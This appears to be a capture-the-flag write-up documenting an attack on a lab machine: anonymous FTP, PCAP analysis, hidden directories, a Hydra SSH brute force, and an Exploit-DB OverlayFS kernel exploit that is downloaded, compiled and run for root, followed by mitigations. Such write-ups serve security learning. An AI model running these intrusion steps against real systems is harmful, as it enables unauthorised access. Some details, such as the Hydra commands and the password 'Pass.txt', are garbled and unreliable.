# CTF Penetration Testing Portfolio

Comprehensive documentation of Capture the Flag (CTF) challenges and penetration testing engagements, demonstrating security research and exploitation techniques from reconnaissance through post-exploitation.

---

## Challenge 1: OverlayFS Privilege Escalation CTF

### Executive Summary

A complete attack chain demonstrating reconnaissance, access, and privilege escalation on a target machine running a vulnerable kernel. Starting from FTP enumeration and progressing through SSH access to root compromise via OverlayFS exploitation.

**Final Flag:** `702a8c18d29c6f3ca0d99ef5712bfbdc`

---

## Phase 1: Reconnaissance

### 1.1 FTP Enumeration

Initial connection to the target machine using anonymous FTP access:

```bash
ftp 192.168.108.138
```

**Credentials Used:**
- Username: `anonymous`
- Password: (blank)

**Directory Listing:**

```bash
ftp> ls
```

The FTP service revealed accessible files and directory structures, providing the first foothold for information gathering.

### 1.2 PCAP Analysis

A packet capture file (`lol.pcap`) was discovered during FTP enumeration and analyzed using Wireshark.

**Analysis Method:**

```bash
wireshark lol.pcap
```

**Extracted Intelligence:**

The PCAP file contained FTP traffic with an embedded message revealing a hidden directory:

> Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-)  
> Sucks, you were so close... gotta TRY HARDER!

**Key Finding:** Hidden directory path discovered: `/sup3rs3cr3tdirlol/`

### 1.3 Web Server Enumeration

The hint in the PCAP led to a hidden directory on the web server:

**URL:** `http://192.168.108.138/sup3rs3cr3tdirlol/`

Browsing this directory revealed an index containing a suspicious file: `roflmao`

**Download:**

```bash
wget http://192.168.108.138/sup3rs3cr3tdirlol/roflmao
```

**Binary Analysis:**

```bash
file roflmao
# Output: roflmao: ELF 64-bit LSB executable...
```

The file was an ELF executable. Examining the binary strings revealed another hidden directory path:

```bash
strings roflmao | grep -E "0x[0-9A-F]+"
```

**Key Finding:** Address discovered: `0x0856BF`

### 1.4 Secondary Web Enumeration

Using the discovered address as a directory path:

**URL:** `http://192.168.108.138/0x0856BF/`

This directory contained:
- `/good_luck/` (subdirectory)
- `which_one_lol.txt` (credentials file)

**Credential File Download:**

```bash
wget http://192.168.108.138/0x0856BF/good_luck/which_one_lol.txt
```

**Contents of `which_one_lol.txt`:**

```text
maleus
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
visit0r
overflow
```

**Reconnaissance Summary:**
- ✅ Discovered hidden directories via PCAP analysis
- ✅ Located and analyzed binary executable
- ✅ Enumerated web server structure
- ✅ Identified potential usernames/passwords

---

## Phase 2: Foothold

### 2.1 SSH Brute Force Attack

With a list of potential credentials, we launched an SSH brute force attack using Hydra.

**First Attempt (Failed):**

```bash
hydra -L which_one_lol.txt -p PASS.txt ssh://192.168.108.138
```

This attempt treated each line as a password attempt but failed to yield results.

**Second Attempt (Successful):**

```bash
hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.108.138
```

Note: The password file name was case-sensitive (`Pass.txt` vs `PASS.txt`). This successful attempt identified valid credentials.

### 2.2 Valid Credentials Identified

**Username:** `overflow`  
**Password:** `Pass.txt`

### 2.3 SSH Access

Successfully established SSH connection to the target:

```bash
ssh overflow@192.168.108.138
Password: Pass.txt
```

**System Information Upon Access:**

```bash
uname -a
id
whoami
```

User `overflow` confirmed with standard user privileges.

**Foothold Summary:**
- ✅ Identified valid SSH credentials
- ✅ Established remote shell access
- ✅ Confirmed user privileges (non-root)
- ✅ Ready for privilege escalation

---

## Phase 3: Privilege Escalation

### 3.1 System Enumeration

After obtaining shell access, we began enumerating the system for privilege escalation vectors.

**Kernel Version Check:**

```bash
uname -r
```

**Exploit Suggester Execution:**

Downloaded and executed Linux Exploit Suggester (les.sh):

```bash
chmod +x les.sh
./les.sh
```

**Identified Vulnerabilities:**

The script flagged multiple potential kernel exploits:
- `dirtycow` (CVE-2016-5195) - Highly probable
- `overlayfs` privilege escalation - Available
- Other kernel-specific exploits

### 3.2 OverlayFS Exploit Selection

While `dirtycow` was suggested, we selected the OverlayFS privilege escalation exploit from Exploit-DB for this engagement.

**Exploit Details:**
- **Source:** Exploit-DB
- **URL:** https://www.exploit-db.com/download/37292
- **Type:** Kernel local privilege escalation
- **Target:** OverlayFS vulnerability

### 3.3 Exploit Preparation

**Download Exploit:**

```bash
wget https://www.exploit-db.com/download/37292
```

**Rename to C Source:**

```bash
mv 37292 37292.c
```

**Compile:**

```bash
gcc 37292.c -o exploit
```

**Verify Compilation:**

```bash
ls -la exploit
file exploit
```

### 3.4 Exploit Execution

**Launch Exploit:**

```bash
./exploit
```

**Execution Results:**

The exploit successfully:
1. Spawned multiple threads to trigger the vulnerability
2. Exploited the OverlayFS kernel bug
3. Escalated privileges from `overflow` to `root`
4. Returned a root shell prompt

**Verification:**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

**Privilege Escalation Summary:**
- ✅ Identified kernel vulnerabilities
- ✅ Selected appropriate exploit
- ✅ Successfully compiled exploit code
- ✅ Achieved root privileges
- ✅ Obtained root shell access

---

## Phase 4: Persistence

### 4.1 Root Access Confirmation

With root privileges obtained, we confirmed persistence of access:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.2 System Compromise Status

**Key Indicators:**
- Full root shell access achieved
- Read/write access to all system files
- Access to sensitive configuration files
- Ability to install backdoors or persistence mechanisms

### 4.3 Post-Exploitation Access

With root access, the following became possible:
- Modification of system files and configurations
- Installation of rootkits or backdoors
- Access to user home directories and data
- Modification of system logs
- Creation of additional user accounts

**Current Persistence Level:** Root shell with full system access

---

## Phase 5: Final Flag

### 5.1 Flag Location

The challenge flag was stored in the root user's home directory.

**Navigation:**

```bash
cd /root
ls -la
```

### 5.2 Flag Retrieval

**Flag File:** `proof.txt`

**Contents:**

```bash
cat proof.txt
```

**Output:**

```text
Good job, you did it!
702a8c18d29c6f3ca0d99ef5712bfbdc
```

### 5.3 Final Flag

```
702a8c18d29c6f3ca0d99ef5712bfbdc
```

**Challenge Status:** ✅ COMPLETED

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────┐
│              COMPLETE ATTACK CHAIN                           │
├─────────────────────────────────────────────────────────────┤
│ 1. FTP Enumeration                                          │
│    └─> Discovered PCAP file with hints                      │
│                                                              │
│ 2. PCAP Analysis                                            │
│    └─> Extracted: /sup3rs3cr3tdirlol/ directory             │
│                                                              │
│ 3. Web Enumeration                                          │
│    └─> Downloaded: roflmao (ELF binary)                     │
│    └─> Extracted: 0x0856BF directory path                   │
│                                                              │
│ 4. Credential Discovery                                     │
│    └─> Found: which_one_lol.txt with usernames              │
│                                                              │
│ 5. SSH Brute Force                                          │
│    └─> Success: overflow / Pass.txt                         │
│                                                              │
│ 6. SSH Access                                               │
│    └─> Established: Non-root shell as 'overflow'            │
│                                                              │
│ 7. Exploit Identification                                   │
│    └─> Identified: OverlayFS kernel vulnerability           │
│                                                              │
│ 8. Privilege Escalation                                     │
│    └─> Exploited: CVE affecting overlayfs                   │
│    └─> Result: Root shell access                            │
│                                                              │
│ 9. Flag Capture                                             │
│    └─> Retrieved: 702a8c18d29c6f3ca0d99ef5712bfbdc          │
└─────────────────────────────────────────────────────────────┘
```

---

## Key Techniques Demonstrated

### Reconnaissance
- ✅ FTP enumeration
- ✅ Packet capture analysis (Wireshark)
- ✅ Hidden directory discovery
- ✅ Binary analysis and string extraction
- ✅ Web server enumeration

### Access
- ✅ Credential harvesting
- ✅ SSH brute force attack (Hydra)
- ✅ Password guessing
- ✅ Remote shell access

### Exploitation
- ✅ Kernel vulnerability identification
- ✅ Exploit compilation and execution
- ✅ Local privilege escalation
- ✅ Root access achievement

### Post-Exploitation
- ✅ System enumeration
- ✅ Flag retrieval
- ✅ Full system compromise

---

## Lessons Learned

1. **Defense in Depth Failure:** Multiple security issues allowed progression through all phases
2. **Weak Credentials:** Simple, guessable passwords led to SSH compromise
3. **Kernel Vulnerabilities:** Unpatched systems are highly vulnerable to local exploits
4. **Information Disclosure:** Hints and messages in binary files revealed directory structures
5. **Anonymous Access:** FTP with anonymous credentials exposed sensitive data

---

## Mitigation Recommendations

1. **Disable Anonymous FTP** unless absolutely necessary
2. **Implement Strong Password Policy** to prevent brute force attacks
3. **Keep System Patched** - Apply kernel and security updates regularly
4. **Remove Unnecessary Services** - Disable FTP, enable only required services
5. **Monitor SSH Access** - Implement IDS/IPS and rate limiting
6. **Remove Debugging Information** - Don't include hints or addresses in binaries
7. **Implement SELinux/AppArmor** - Additional mandatory access control layers
8. **Regular Security Audits** - Identify and fix vulnerabilities proactively

---

## Tools Used

| Tool | Purpose | Command |
|------|---------|----------|
| FTP | File Transfer Protocol client | `ftp 192.168.108.138` |
| Wireshark | Packet capture analysis | `wireshark lol.pcap` |
| wget | File download | `wget [URL]` |
| file | File type identification | `file roflmao` |
| strings | Extract text strings from binary | `strings roflmao` |
| Hydra | SSH brute force | `hydra -L users.txt -p pass.txt ssh://[target]` |
| ssh | Secure shell access | `ssh overflow@192.168.108.138` |
| gcc | C compiler | `gcc 37292.c -o exploit` |
| les.sh | Linux Exploit Suggester | `./les.sh` |
| cat | Display file contents | `cat proof.txt` |

---

## Challenge Metadata

- **Difficulty Level:** Medium
- **Required Skills:** Reconnaissance, SSH, Linux exploitation, Kernel vulnerabilities
- **Time to Complete:** ~45-60 minutes
- **Primary Vulnerability:** Unpatched kernel (OverlayFS CVE)
- **Secondary Vulnerabilities:** Weak credentials, information disclosure

---

**Challenge Completed:** October 7, 2026  
**Final Flag:** `702a8c18d29c6f3ca0d99ef5712bfbdc`

---

## References

- [Exploit-DB OverlayFS Exploit](https://www.exploit-db.com/download/37292)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Wireshark Documentation](https://www.wireshark.org/)
- [Hydra SSH Documentation](https://github.com/vanhauser-thc/thc-hydra)
